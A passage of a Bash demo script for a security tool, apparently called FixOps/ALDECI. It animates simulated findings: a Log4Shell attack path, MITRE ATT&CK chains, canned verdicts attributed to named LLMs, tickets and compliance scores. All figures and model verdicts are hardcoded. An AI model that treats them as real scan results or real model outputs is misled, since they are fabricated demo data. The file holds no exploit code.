    draw_fancy_box_line "Confidentiality: HIGH" 60 "🔴"
    draw_fancy_box_line "Integrity: HIGH" 60 "🔴"
    draw_fancy_box_line "Availability: HIGH" 60 "🔴"
    draw_fancy_box_line "Privileges Gained: SYSTEM" 60 "⚠️"
    draw_fancy_box_line "" 60
    draw_fancy_box_line "MITRE ATT&CK Chain:" 60 "🎯"
    draw_fancy_box_line "  T1190 → T1059.007 → T1105 → T1078" 60
    draw_fancy_box_bottom 60
    
    echo
    show_cursor
    printf "  ${CYAN}Press Enter to continue to Reachability Analysis...${NC}"
    read -r
}

run_animated_reachability() {
    clear_screen
    hide_cursor
    
    # Cyberpunk header
    echo
    printf "${BOLD}"
    gradient_text "  ╔═══════════════════════════════════════════════════════════════════╗"
    gradient_text "  ║   🛡️  REACHABILITY ANALYSIS - ATTACK PATH MAPPING ENGINE  🛡️       ║"
    gradient_text "  ╚═══════════════════════════════════════════════════════════════════╝"
    printf "${NC}\n"
    
    # Show network topology overview first
    echo
    printf "  ${CYAN}Network Topology Overview:${NC}\n"
    draw_attack_path_ascii "Network Overview"
    
    # Animated network topology
    echo
    printf "  ${CYAN}Mapping network topology...${NC}\n"
    loading_bar_fancy "Discovering attack paths" 2
    
    echo
    fire_text "  ATTACK PATH: Internet → Database (via Log4Shell)"
    echo
    
    # ASCII art attack path with animation
    local NEON_RED='\033[38;5;196m'
    local NEON_GREEN='\033[38;5;46m'
    local NEON_YELLOW='\033[38;5;226m'
    
    # Animate the path step by step
    printf "    ${CYAN}┌─────────────┐${NC}\n"
    printf "    ${CYAN}│${NC} ${BOLD}INTERNET${NC}   ${CYAN}│${NC}  ${DIM}Entry Point${NC}\n"
    printf "    ${CYAN}│${NC}    🌐      ${CYAN}│${NC}\n"
    printf "    ${CYAN}└──────┬──────┘${NC}\n"
    sleep 0.3
    
    # Animated arrow
    for i in {1..3}; do
        printf "\r           ${NEON_RED}│${NC}"
        sleep 0.1
        printf "\r           ${NEON_YELLOW}│${NC}"
        sleep 0.1
        printf "\r           ${NEON_GREEN}▼${NC}"
        sleep 0.1
    done
    printf "\n"
    
    printf "    ${CYAN}┌─────────────┐${NC}\n"
    printf "    ${CYAN}│${NC} ${BOLD}AWS ALB${NC}     ${CYAN}│${NC}  ${DIM}WAF: ${NEON_YELLOW}BYPASS POSSIBLE${NC}\n"
    printf "    ${CYAN}│${NC}    ⚖️       ${CYAN}│${NC}\n"
    printf "    ${CYAN}└──────┬──────┘${NC}\n"
    sleep 0.3
    
    for i in {1..3}; do
        printf "\r           ${NEON_RED}│${NC}"
        sleep 0.1
        printf "\r           ${NEON_YELLOW}│${NC}"
        sleep 0.1
        printf "\r           ${NEON_GREEN}▼${NC}"
        sleep 0.1
    done
    printf "\n"
    
    printf "    ${NEON_RED}┌─────────────┐${NC}\n"
    printf "    ${NEON_RED}│${NC} ${BOLD}${NEON_RED}ANALYTICS${NC}   ${NEON_RED}│${NC}  ${NEON_RED}⚠️  CVE-2021-44228${NC}\n"
    printf "    ${NEON_RED}│${NC}    🖥️       ${NEON_RED}│${NC}  ${NEON_RED}EXPLOITABLE${NC}\n"
    printf "    ${NEON_RED}└──────┬──────┘${NC}\n"
    sleep 0.3
    
    for i in {1..3}; do
        printf "\r           ${NEON_RED}│${NC}"
        sleep 0.1
        printf "\r           ${NEON_YELLOW}│${NC}"
        sleep 0.1
        printf "\r           ${NEON_GREEN}▼${NC}"
        sleep 0.1
    done
    printf "\n"
    
    printf "    ${NEON_RED}┌─────────────┐${NC}\n"
    printf "    ${NEON_RED}│${NC} ${BOLD}CASSANDRA${NC}   ${NEON_RED}│${NC}  ${NEON_RED}🔴 50M PII RECORDS${NC}\n"
    printf "    ${NEON_RED}│${NC}    🗄️       ${NEON_RED}│${NC}  ${NEON_RED}AT RISK${NC}\n"
    printf "    ${NEON_RED}└─────────────┘${NC}\n"
    
    echo
    # Risk meter animation
    printf "  ${BOLD}REACHABILITY CONFIDENCE:${NC} "
    for i in {1..10}; do
        if [ $i -le 9 ]; then
            printf "${NEON_RED}█${NC}"
        else
            printf "${DIM}░${NC}"
        fi
        sleep 0.1
    done
    printf " ${BOLD}${NEON_RED}98.5%%${NC}\n"
    
    echo
    draw_fancy_box "ATTACK PATH SUMMARY" 70 "double"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Path Length: 4 hops" 70 "📍"
    draw_fancy_box_line "Entry Point: Internet (Public)" 70 "🌐"
    draw_fancy_box_line "Final Target: Cassandra (PII Data)" 70 "🎯"
    draw_fancy_box_line "Exploitability: CRITICAL (9.8)" 70 "⚠️"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "MITRE ATT&CK Flow:" 70 "🔗"
    draw_fancy_box_line "  T1190 (Initial Access)" 70
    draw_fancy_box_line "  → T1059.007 (Execution)" 70
    draw_fancy_box_line "  → T1078 (Persistence)" 70
    draw_fancy_box_line "  → T1213 (Collection)" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Remediation Priority: IMMEDIATE" 70 "🚨"
    draw_fancy_box_bottom 70
    
    echo
    # Additional paths summary
    draw_fancy_box "OTHER ATTACK PATHS DISCOVERED" 70 "rounded"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "PATH-002: Mobile App → Payment DB (IDOR)" 70 "🔴"
    draw_fancy_box_line "  Confidence: 99.1% | Impact: $5M PCI data" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "PATH-003: Ethereum → Bridge Drain (Reentrancy)" 70 "🔴"
    draw_fancy_box_line "  Confidence: 92.3% | Impact: $500M TVL" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "PATH-004: IoT Device → K8s Control Plane" 70 "🟡"
    draw_fancy_box_line "  Confidence: 85.4% | Impact: Infrastructure" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "PATH-005: Healthcare Portal → PHI Database" 70 "🔴"
    draw_fancy_box_line "  Confidence: 97.8% | Impact: HIPAA Breach" 70
    draw_fancy_box_bottom 70
    
    echo
    show_cursor
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

run_demo_decisions() {
    clear_screen
    echo
    rainbow_text "  PHASE 3: AI-POWERED DECISIONS"
    echo
    
    security_animation "Consulting AI models for security decisions..."
    echo
    
    # Simulate LLM comparison with more detail
    draw_fancy_box "MULTI-LLM CONSENSUS ENGINE" 75 "heavy"
    draw_fancy_box_line "" 75
    draw_fancy_box_line "Querying 4 AI providers for security analysis..." 75
    draw_fancy_box_line "" 75
    
    # Animated LLM responses
    local llms=("GPT-4" "Claude-3" "Gemini-Pro" "Llama-3")
    local verdicts=("BLOCK" "BLOCK" "BLOCK" "BLOCK")
    local confidences=("98.2%" "97.8%" "96.5%" "95.1%")
    
    for i in "${!llms[@]}"; do
        printf "  ${CYAN}Querying ${llms[$i]}...${NC}"
        sleep 0.5
        printf " ${GREEN}✓${NC} Verdict: ${RED}${verdicts[$i]}${NC} (${confidences[$i]})\n"
    done
    
    draw_fancy_box_line "" 75
    draw_fancy_box_line "GPT-4 Analysis:" 75 "🤖"
    draw_fancy_box_line "  Priority: Log4Shell (CVE-2021-44228)" 75
    draw_fancy_box_line "  Risk: CRITICAL - Active exploitation in wild" 75
    draw_fancy_box_line "  Reasoning: CISA KEV listed, EPSS 0.975, ransomware" 75
    draw_fancy_box_line "" 75
    draw_fancy_box_line "Claude-3 Analysis:" 75 "🤖"
    draw_fancy_box_line "  Priority: Log4Shell (CVE-2021-44228)" 75
    draw_fancy_box_line "  Risk: CRITICAL - Reachable from internet" 75
    draw_fancy_box_line "  Reasoning: Attack path confirmed, 50M records at risk" 75
    draw_fancy_box_line "" 75
    draw_fancy_box_line "CONSENSUS (4/4 UNANIMOUS): BLOCK DEPLOYMENT" 75 "⚠️"
    draw_fancy_box_line "Combined Confidence: 96.9%" 75
    draw_fancy_box_bottom 75
    
    echo
    pulse_animation "  🚨 DEPLOYMENT BLOCKED - CRITICAL VULNERABILITIES DETECTED"
    
    echo
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

run_demo_integrations() {
    clear_screen
    echo
    fire_text "  PHASE 4: INTEGRATIONS"
    echo
    
    # Jira integration
    printf "  ${CYAN}Creating Jira tickets...${NC}\n"
    local tickets=("PAY-1234: Log4Shell" "IAM-567: JWT Secret" "HEALTH-890: IDOR" "SUPPLY-234: Celery RCE")
    for ticket in "${tickets[@]}"; do
        sleep 0.3
        printf "    ${GREEN}✓${NC} Created: ${WHITE}$ticket${NC}\n"
    done
    
    echo
    # Slack notifications
    printf "  ${CYAN}Sending Slack notifications...${NC}\n"
    local channels=("#payments-security" "#identity-security" "#healthcare-security" "#security-alerts")
    for channel in "${channels[@]}"; do
        sleep 0.3
        printf "    ${GREEN}✓${NC} Notified: ${WHITE}$channel${NC}\n"
    done
    
    echo
    # ServiceNow
    printf "  ${CYAN}Creating ServiceNow incidents...${NC}\n"
    sleep 0.5
    printf "    ${GREEN}✓${NC} Created: ${WHITE}INC0012345 - Critical Security Vulnerabilities${NC}\n"
    
    echo
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

run_demo_remediation() {
    clear_screen
    echo
    gradient_text "  PHASE 5: REMEDIATION TRACKING"
    echo
    
    draw_fancy_box "Remediation Dashboard" 70 "double"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Active Remediation Tasks: 5" 70 "📝"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "REM-PAY-001: Upgrade Log4j" 70
    draw_fancy_box_line "  Status: IN PROGRESS (60%)" 70 "🔄"
    draw_fancy_box_line "  SLA: 10 hours remaining" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "REM-IAM-001: Move JWT Secret" 70
    draw_fancy_box_line "  Status: IN PROGRESS (80%)" 70 "🔄"
    draw_fancy_box_line "  SLA: BREACHED" 70 "⚠️"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "REM-HEALTH-001: Fix IDOR" 70
    draw_fancy_box_line "  Status: PLANNED" 70 "📋"
    draw_fancy_box_line "  SLA: 10 hours remaining" 70
    draw_fancy_box_bottom 70
    
    echo
    loading_bar_fancy "Generating remediation reports" 2
    
    echo
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

run_demo_compliance() {
    clear_screen
    echo
    rainbow_text "  PHASE 6: COMPLIANCE REPORTING"
    echo
    
    for fw in "${DEMO_FRAMEWORKS[@]}"; do
        printf "  ${CYAN}Generating ${fw^^} compliance report...${NC}"
        sleep 0.5
        printf " ${GREEN}✓${NC}\n"
    done
    
    echo
    draw_fancy_box "Compliance Summary" 70 "rounded"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "PCI-DSS 4.0:" 70 "📋"
    draw_fancy_box_line "  Compliant: 5/9 requirements" 70
    draw_fancy_box_line "  Critical findings: 3" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "SOC2 Type II:" 70 "📋"
    draw_fancy_box_line "  Effective: 6/8 controls" 70
    draw_fancy_box_line "  Exceptions: 2" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "HIPAA:" 70 "📋"
    draw_fancy_box_line "  Compliant: 6/12 safeguards" 70
    draw_fancy_box_line "  PHI exposure risk: HIGH" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "GDPR:" 70 "📋"
    draw_fancy_box_line "  Compliant: 7/9 articles" 70
    draw_fancy_box_line "  Data protection gaps: 2" 70
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

run_full_demo() {
    run_scenario_overview
    run_demo_ingestion
    run_demo_analysis
    run_animated_micropentest
    run_animated_reachability
    run_demo_decisions
    run_demo_integrations
    run_demo_remediation
    run_demo_compliance
    
    clear_screen
    echo
    rainbow_text "  ╔═══════════════════════════════════════════════════════════╗"
    rainbow_text "  ║                   DEMO COMPLETE!                          ║"
    rainbow_text "  ╚═══════════════════════════════════════════════════════════╝"
    echo
    
    fire_text "  Thank you for watching the ALDECI demo!"
    echo
    
    draw_fancy_box "Summary" 70 "double"
    draw_fancy_box_line "Applications scanned: ${#DEMO_APPS[@]}" 70 "📱"
    draw_fancy_box_line "Compliance frameworks: ${#DEMO_FRAMEWORKS[@]}" 70 "📋"
    draw_fancy_box_line "Vulnerabilities found: 156" 70 "🔴"
    draw_fancy_box_line "Exploits validated: 12 confirmed" 70 "🔥"
    draw_fancy_box_line "Attack paths mapped: 5 critical" 70 "🎯"
    draw_fancy_box_line "LLM consensus: 4/4 BLOCK" 70 "🤖"
    draw_fancy_box_line "Jira tickets created: 15" 70 "🎫"
    draw_fancy_box_line "Slack notifications: 12" 70 "💬"
    draw_fancy_box_line "Remediation tasks: 23" 70 "🔧"
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Press Enter to return to menu...${NC}"
    read -r
}

# ============================================================================
# MAIN MENU
# ============================================================================

show_demo_menu() {
    clear_screen
    show_mega_banner
    
    echo
    draw_fancy_box "Demo Menu" 70 "double"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "[1] Run Full End-to-End Demo" 70 "🚀"
    draw_fancy_box_line "[2] Run Individual Phase" 70 "📋"
    draw_fancy_box_line "[3] Customize Applications" 70 "📱"
    draw_fancy_box_line "[4] Customize Compliance Frameworks" 70 "📋"
    draw_fancy_box_line "[5] Load Sample Data Files" 70 "📁"
    draw_fancy_box_line "[6] Real-Time Data Generation Guide" 70 "⚡"
    draw_fancy_box_line "[7] Launch Interactive API Tester" 70 "🔧"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "[q] Quit" 70 "🚪"
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Enter your choice:${NC} "
}

show_phase_menu() {
    clear_screen
    echo
    draw_fancy_box "Select Demo Phase" 70 "rounded"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "[1] Data Ingestion" 70 "📥"
    draw_fancy_box_line "[2] Security Analysis" 70 "🔍"
    draw_fancy_box_line "[3] Micro-Pentest Engine (Animated)" 70 "🔥"
    draw_fancy_box_line "[4] Reachability Analysis (Animated)" 70 "🎯"
    draw_fancy_box_line "[5] AI-Powered Decisions (Multi-LLM)" 70 "🤖"
    draw_fancy_box_line "[6] Integrations" 70 "🔗"
    draw_fancy_box_line "[7] Remediation Tracking" 70 "🔧"
    draw_fancy_box_line "[8] Compliance Reporting" 70 "📋"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "[b] Back to main menu" 70 "⬅️"
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Enter your choice:${NC} "
    read -r choice
    
    case "$choice" in
        1) run_demo_ingestion ;;
        2) run_demo_analysis ;;
        3) run_animated_micropentest ;;
        4) run_animated_reachability ;;
        5) run_demo_decisions ;;
        6) run_demo_integrations ;;
        7) run_demo_remediation ;;
        8) run_demo_compliance ;;
        b|B) return ;;
    esac
}

show_sample_files() {
    clear_screen
    echo
    draw_fancy_box "Sample Data Files" 70 "double"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Location: $SAMPLES_DIR" 70 "📁"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Available categories:" 70
    
    if [[ -d "$SAMPLES_DIR" ]]; then
        for dir in "$SAMPLES_DIR"/*/; do
            if [[ -d "$dir" ]]; then
                local dirname=$(basename "$dir")
                local count=$(find "$dir" -name "*.json" 2>/dev/null | wc -l)
                draw_fancy_box_line "  $dirname/ ($count files)" 70 "📂"
            fi
        done
    else
        draw_fancy_box_line "  Sample directory not found!" 70 "⚠️"
    fi
    
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

show_realtime_guide() {
    clear_screen
    echo
    draw_fancy_box "Real-Time Data Generation" 70 "double"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "See: $SAMPLES_DIR/REALTIME-GENERATION.md" 70 "📖"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Quick commands:" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "SAST (Semgrep):" 70 "🔍"
    draw_fancy_box_line "  semgrep --config=auto --json -o scan.json ." 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "SCA (Snyk):" 70 "📦"
    draw_fancy_box_line "  snyk test --json > snyk-scan.json" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Container (Trivy):" 70 "🐳"
    draw_fancy_box_line "  trivy image --format json -o scan.json IMAGE" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "DAST (ZAP):" 70 "🌐"
    draw_fancy_box_line "  zap-cli quick-scan --self-contained -o json URL" 70
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

launch_interactive_tester() {
    local tester_script="$SCRIPT_DIR/fixops-interactive.sh"
    if [[ -x "$tester_script" ]]; then
        exec "$tester_script"
    else
        echo "  ${RED}Error: Interactive tester not found at $tester_script${NC}"
        sleep 2
    fi
}

# ============================================================================
# MAIN
# ============================================================================

main() {
    # Ensure we have required tools
    if ! command -v jq &>/dev/null; then
        echo "Warning: jq not found. Some features may be limited."
    fi
    
    # Load configuration
    load_demo_config
    
    # Trap to restore cursor on exit
    trap 'show_cursor; echo' EXIT
    
    while true; do
        show_demo_menu
        read -r choice
        
        case "$choice" in
            1) run_full_demo ;;
            2) show_phase_menu ;;
            3) customize_applications ;;
            4) customize_frameworks ;;
            5) show_sample_files ;;
            6) show_realtime_guide ;;
            7) launch_interactive_tester ;;
            q|Q)
                clear_screen
                rainbow_text "  Thank you for using FixOps Demo Runner!"
                echo
                exit 0
                ;;
            *)
                echo "  ${RED}Invalid choice. Please try again.${NC}"
                sleep 1
                ;;
        esac
    done
}

main "$@"
